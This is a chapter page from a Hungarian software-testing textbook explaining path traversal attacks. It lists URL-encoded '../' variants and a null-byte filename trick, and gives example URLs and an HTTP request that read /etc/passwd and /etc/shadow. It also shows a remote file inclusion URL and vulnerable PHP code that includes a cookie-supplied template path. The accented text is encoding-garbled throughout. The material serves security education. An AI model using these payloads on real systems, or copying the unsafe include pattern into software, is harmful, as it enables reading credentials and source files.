<html><head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
   <title>6.7. &#8222;⁄tkeresztez√©si t√°mad√°s&#8221; (Path Traversal Attack)</title><link rel="stylesheet" href="style.css" type="text/css"><meta name="generator" content="DocBook XSL Stylesheets V1.75.2"><link rel="home" href="index.html" title="Szoftvertesztel√©s"><link rel="up" href="ch06.html" title="6. fejezet - Biztons√°gi tesztel√©s"><link rel="prev" href="ch06s06.html" title="6.6. Befecskendez√©s &#8211; K√∂zvetlen statikus k√≥d befecskendez√©se"><link rel="next" href="ch06s08.html" title="6.8. &#8222;Pr√≥b√°lgat√°sos technik√°k &#8211; Nyers Er&#337; t√°mad√°s&#8221; (Probabilistic Techniques - Brute force attack)"></head><body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF"><div class="navheader"><table width="100%" summary="Navigation header"><tr><th colspan="3" align="center">6.7. 
      
            &#8222;⁄tkeresztez√©si t√°mad√°s&#8221; (Path Traversal Attack)</th></tr><tr><td width="20%" align="left"><a accesskey="p" href="ch06s06.html">El&#337;z&#337;</a>&nbsp;</td><th width="60%" align="center">6. fejezet - Biztons√°gi tesztel√©s</th><td width="20%" align="right">&nbsp;<a accesskey="n" href="ch06s08.html">K√∂vetkez&#337;</a></td></tr></table><hr></div><div class="sect1" title="6.7. &#8222;⁄tkeresztez√©si t√°mad√°s&#8221; (Path Traversal Attack)"><div class="titlepage"><div><div><h2 class="title" style="clear: both"><a name="d0e3420"></a>6.7. 
      
            <a name="Overview3"></a>&#8222;⁄tkeresztez√©si t√°mad√°s&#8221; (Path Traversal Attack)</h2></div></div></div><div class="sect2" title="6.7.1. √°ttekint√©s"><div class="titlepage"><div><div><h3 class="title"><a name="d0e3425"></a>6.7.1. 
      
               <a name="_Toc291181657"></a>√°ttekint√©s</h3></div></div></div><p>Az &#8222;√∫tkeresztez√©si t√°mad√°sok&#8221; olyan f√°jlok √©s k√∂nyvt√°rak el√©r√©s√©t c√©lozz√°k, amik a h√°l√≥zati gy√∂k√©r (web root) k√∂nyvt√°ron k√≠v√ºl vannak elt√°rolva. Az alkalmaz√°s b√∂ng√©sz√©se k√∂zben a t√°mad√≥ olyan k√∂zvetlen hivatkoz√°sokat keres, ami a web szerveren t√°rolt f√°jlokra mutatnak. A &#8222; ../ &#8221; sorozatot √©s &nbsp;v√°ltoz√≥it tartalmaz√≥ f√°jlok manipul√°l√°s√°val lehets√©ges lehet tetsz&#337;leges olyan f√°jlhoz vagy k√∂nyvt√°rhoz hozz√°f√©rni, ami a f√°jlrendszerben van t√°rolva, bele√©rtve az alkalmaz√°sok forr√°sk√≥djait , konfigur√°ci√≥s- √©s a rendszer m&#369;k√∂d√©se szempontj√°b√≥l kritikus egy√©b f√°jlokat, amit csak a rendszer hozz√°f√©r√©si m&#369;veletek korl√°toznak. A t√°mad√≥ &#8220;../&#8221; sorozatokat haszn√°l, hogy f√∂ljebb l√©pjen a gy√∂k√©rk√∂nyvt√°rba √©s √≠gy lehet&#337;v√© tegye a f√°jlrendszerben val√≥ mozg√°st.</p><p>Ezt a t√°mad√°st egy olyan k√ºls&#337; √°rtalmas k√≥d befecskendez√©s√©vel lehet kivitelezni, ami a Resource Ijection (Forr√°s befecskendez√©s) t√°mad√°st√≠pus √°ltal kitaposott √∂sv√©nyt haszn√°lja. A t√°mad√°s kivitelez√©s√©hez nem sz√ºks√©ges k√ºl√∂nleges eszk√∂z√∂k haszn√°lata; a behatol√≥ √°ltal√°ban valamilyen internetes f√ºrk√©szt (web spider/crawler) haszn√°l, hogy felder√≠tse az √∂sszes haszn√°lhat√≥ URL-t.</p><p>Ezt a t√°mad√°st t√∂bb n√©ven is ismerik, p√©ld√°ul:</p><div class="orderedlist"><ol class="orderedlist" type="1"><li class="listitem"><p>&#8220;dot-dot-slash&#8221; (&#8222;pont-pont-vessz&#337;cske&#8221;)</p></li><li class="listitem"><p>&#8220;directory traversal&#8221; (&#8222;k√∂nyvt√°rkeresztez√©s&#8221;)</p></li><li class="listitem"><p>&#8220;directory climbing&#8221;(&#8222;k√∂nyvt√°rm√°sz√°s&#8221;)</p></li><li class="listitem"><p>&#8220;backtracking&#8221; (&#8222;visszak√∂vet√©s&#8221;).</p></li></ol></div></div><div class="sect2" title="6.7.2. Le√≠r√°s"><div class="titlepage"><div><div><h3 class="title"><a name="d0e3449"></a>6.7.2. 
      
               <a name="__RefHeading__17874_1902038280"></a>
      
               <a name="_Toc291181658"></a>Le√≠r√°s</h3></div></div></div><div class="sect3" title="6.7.2.1. K√©relem v√°ltozatok"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3456"></a>6.7.2.1. 
      
                  <a name="Request_variations1"></a>K√©relem v√°ltozatok</h4></div></div></div><p>K√≥dol√°s √©s dupla k√≥dol√°s:</p><p>%2e%2e%2f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se&nbsp; &nbsp; &nbsp; &nbsp;  ../</p><p>%2e%2e/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ../</p><p>..%2f &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ../ </p><p>%2e%2e%5c &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\</p><p>%2e%2e\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\ </p><p>..%5c &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\ </p><p>%252e%252e%255c &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\ </p><p>..%255c &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\</p><p>√©s √≠gy tov√°bb...</p></div><div class="sect3" title="6.7.2.2. Sz√°zal√©kos k√≥dol√°s (m√°s n√©ven URL k√≥dol√°s) (Percent encoding (aka URL encoding))"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3481"></a>6.7.2.2. Sz√°zal√©kos k√≥dol√°s (m√°s n√©ven URL k√≥dol√°s) (Percent encoding (aka URL encoding))</h4></div></div></div><p>Megjegyz√©s: a web t√°rol√≥k egy szintnyi k√≥dol√°st hajtanak v√©gre a form-okr√≥l √©s az URL-ekr&#337;l sz√°rmaz√≥ sz√°zal√©kosan k√≥dolt √©rt√©keken.</p><p>..%c0%af &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ../ </p><p>..%c1%9c &nbsp; &nbsp; &nbsp; &nbsp; jelent√©se &nbsp; &nbsp; &nbsp; &nbsp; ..\ </p><p>Oper√°ci√≥s rendszer specifikusan</p><p>UNIX</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Gy√∂k√©rk√∂nyvt√°r: &nbsp;&#8220; / &#8220; </p><p>&nbsp; &nbsp; &nbsp; &nbsp; K√∂nyvt√°r elv√°laszt√≥: &#8220; / &#8220;</p><p>WINDOWS</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Gy√∂k√©rk√∂nyvt√°r: &#8220; &nbsp;&lt;part√≠ci√≥ bet&#369;jele&gt;&nbsp;: \ &#8220;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; K√∂nyvt√°relv√°laszt√≥: &#8220; / &#8220; vagy &#8220; \ &#8221; </p><p>Megjegyz√©s: a Windows engedi, hogy a f√°jlneveket r√°ad√°s &nbsp;. \ / karakterek k√∂vess√©k.</p><p>A legt√∂bb oper√°ci√≥s rendszerben null b√°jtokat (%00) lehet injekt√°lni a f√°jln√©v lez√°r√°sa c√©lj√°b√≥l. P√©ld√°ul a k√∂vetkez&#337; param√©ter elk√ºld√©se:</p><p>?file=secret.doc%00.pdf</p><p>azt eredm√©nyezi, hogy a Java alkalmaz√°s √∫gy l√°tja, hogy a sztring &#8222;.pdf&#8221;-el √©r v√©get, m√≠g az oper√°ci√≥s rendszer √∫gy l√°tja, hogy a f√°jl v√©g√©n ".doc" √°ll. A t√°mad√≥k ezt a tr√ºkk√∂t arra haszn√°lhatj√°k, hogy √°tjussanak az √©rv√©nyes√≠t&#337; rutinon.</p></div></div><div class="sect2" title="6.7.3. P√©ld√°k"><div class="titlepage"><div><div><h3 class="title"><a name="d0e3512"></a>6.7.3. 
      
               <a name="Examples12"></a>P√©ld√°k</h3></div></div></div><div class="sect3" title="6.7.3.1. P√©lda 1"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3517"></a>6.7.3.1. 
      
                  <a name="Example_13"></a>P√©lda 1</h4></div></div></div><p>A k√∂vetkez&#337; p√©lda megmutatja, hogy az alkalmaz√°s hogyan b√°nik a haszn√°latban l√©v&#337; er&#337;forr√°sokkal:</p><p>&nbsp;http://some_site.com.br/get-files.jsp?file=report.pdf &nbsp;</p><p>&nbsp;http://some_site.com.br/get-page.php?home=aaa.html &nbsp;</p><p>&nbsp;http://some_site.com.br/some-page.asp?page=index.html &nbsp;</p><p>Ebben a p√©ld√°ban lehets√©ges olyan √°rtalmas sztringet beilleszteni, mint v√°ltoz√≥ param√©tert, hogy hozz√°f√©rj√ºnk a webes k√∂nyvt√°ron k√≠v√ºli f√°jlokhoz.</p><p>http://some_site.com.br/get-files?file=../../../../some dir/some file </p><p>http://some_site.com.br/../../../../some dir/some file </p><p>A k√∂vetkez&#337; URL-ek a *NIX jelsz√≥ f√°jl kihaszn√°l√°s√°nak p√©ld√°j√°t mutatj√°k be:</p><p>http://some_site.com.br/../../../../etc/shadow &nbsp;</p><p>http://some_site.com.br/get-files?file=/etc/passwd </p><p>Megjegyz√©s: Windows k√∂rnyezetben a t√°mad√≥ csak azon a part√≠ci√≥n mozoghat, amin a webes gy√∂k√©rk√∂nyvt√°r is tal√°lhat√≥, m√≠g Linux k√∂rnyezetben az eg√©sz merevlemezt bej√°rhatja.</p></div><div class="sect3" title="6.7.3.2. P√©lda 2"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3544"></a>6.7.3.2. 
      
                  <a name="Example_24"></a>P√©lda 2</h4></div></div></div><p>Lehets√©ges ezent√∫l k√ºls&#337; webhelyen tal√°lhat√≥ f√°jlok √©s szkriptek belefoglal√°sa is.</p><p>http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php &nbsp; </p></div><div class="sect3" title="6.7.3.3. P√©lda 3"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3553"></a>6.7.3.3. 
      
                  <a name="Example_31"></a>P√©lda 3</h4></div></div></div><p>Ez a p√©lda azt az esetet mutatja be, mikor a t√°mad√≥ arra k√©nyszer√≠tette a szervert, hogy megmutassa a CGI forr√°sk√≥dot.</p><p>http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi &nbsp; </p></div><div class="sect3" title="6.7.3.4. P√©lda 4"><div class="titlepage"><div><div><h4 class="title"><a name="d0e3562"></a>6.7.3.4. 
      
                  <a name="_Toc291181664"></a>P√©lda 4</h4></div></div></div><p>Ez a p√©lda a Wikipedia - Directory Traversal oldalr√≥l lett tov√°bbg√∂ngy√∂l√≠tve</p><p>A sebezhet&#337; alkalmaz√°s k√≥dj√°nak tipikus p√©ld√°ja:</p><pre class="programlisting">
   &lt;?php
   $template = 'blue.php';
   if ( is_set( $_COOKIE['TEMPLATE'] ) )
   &nbsp; &nbsp;$template = $_COOKIE['TEMPLATE'];
   include ( "/home/users/phpguru/templates/" . $template );
   ?&gt;
         </pre><p>Ez ellen a rendszer ellen a k√∂vetkez&#337; HTTP k√©relmet lehet t√°mad√°sk√©nt haszn√°lni:</p><pre class="programlisting">
   GET /vulnerable.php HTTP/1.0
   Cookie: TEMPLATE=../../../../../../../../../etc/passwd
         </pre><p>A k√∂vetkez&#337; szerver v√°laszt gener√°ljuk:</p><pre class="programlisting">
   HTTP/1.0 200 OK
   Content-Type: text/html
   Server: Apache
   
   root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh 
   daemon:*:1:1::/tmp: 
   phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
         </pre><p>Az ism√©telt ../ karakterek a /home/users/phpguru/templates/ ut√°n azt okozt√°k, hogy a <a class="ulink" href="http://www.php.net/manual/en/function.include.php" target="_top">include()</a> &nbsp;√°tker√ºlj√∂n a gy√∂k√©rk√∂nyvt√°rba √©s tartalmazza az <a class="ulink" href="http://www.owasp.org/index.php?title=Passwd&amp;action=edit&amp;redlink=1" target="_top">/etc/passwd</a> UNIX jelsz√≥ f√°jlt.</p><p>A UNIX etc/passwd egy szok√°sos f√°jl arra, hogy bemutassuk a directory traversal-t, mivel a sz√°m√≠t√≥g√©pes kal√≥zok gyakran haszn√°lj√°k arra, hogy jelszavakat t√∂rjenek fel.</p></div></div><div class="sect2" title="6.7.4. &#8222;Abszol√∫t √∫tkeresztez√©s&#8221; (Absolute Path Traversal)"><div class="titlepage"><div><div><h3 class="title"><a name="d0e3591"></a>6.7.4. 
      
               <a name="Absolute_Path_Traversal1"></a>&#8222;Abszol√∫t √∫tkeresztez√©s&#8221; (Absolute Path Traversal)</h3></div></div></div><p>A k√∂vetkez&#337; URL-ek √©rz√©kenyek lehetnek erre a t√°mad√°sra:</p><pre class="programlisting">
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
         </pre><p>A t√°mad√≥ a k√∂vetkez&#337; m√≥don kivitelezhet egy ilyen t√°mad√°st:</p><pre class="programlisting">
 http://testsite.com/get.php?f=/var/www/html/get.php
 http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
 http://testsite.com/get.asp?f=/etc/passwd
         </pre><p>Amikor a web szerver a webes alkalmaz√°s hib√°it tartalmaz√≥ inform√°ci√≥val t√©r vissza, akkor a t√°mad√≥nak sokkal egyszer&#369;bb kital√°lni a pontos helyet (vagyis a forr√°sk√≥dot tartalmaz√≥ f√°jlhoz vezet&#337; utat, amit azt√°n megjelen√≠thet).</p></div></div><div class="navfooter"><hr><table width="100%" summary="Navigation footer"><tr><td width="40%" align="left"><a accesskey="p" href="ch06s06.html">El&#337;z&#337;</a>&nbsp;</td><td width="20%" align="center"><a accesskey="u" href="ch06.html">Fel</a></td><td width="40%" align="right">&nbsp;<a accesskey="n" href="ch06s08.html">K√∂vetkez&#337;</a></td></tr><tr><td width="40%" align="left" valign="top">6.6. 
      
            Befecskendez√©s &#8211; K√∂zvetlen statikus k√≥d befecskendez√©se&nbsp;</td><td width="20%" align="center"><a accesskey="h" href="index.html">Tartalom</a></td><td width="40%" align="right" valign="top">&nbsp;6.8. 
      
            &#8222;Pr√≥b√°lgat√°sos technik√°k &#8211; Nyers Er&#337; t√°mad√°s&#8221; (Probabilistic Techniques - Brute force attack)</td></tr></table></div></body></html>